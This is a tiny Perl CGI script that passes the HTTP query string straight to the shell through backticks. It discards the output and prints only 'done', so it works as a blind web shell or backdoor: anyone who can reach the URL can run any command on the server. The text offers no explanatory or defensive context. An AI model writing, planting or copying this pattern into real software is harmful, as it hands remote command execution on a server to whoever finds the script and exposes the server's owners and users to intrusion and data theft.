#!/usr/bin/perl
print "Content-type: text/html\n\n";
my $job = $ENV{QUERY_STRING};
my @results = `$job`;
@results = ('done');
print "<pre>";
foreach my $entry (@results) {
    print $entry . "<br/>";
}
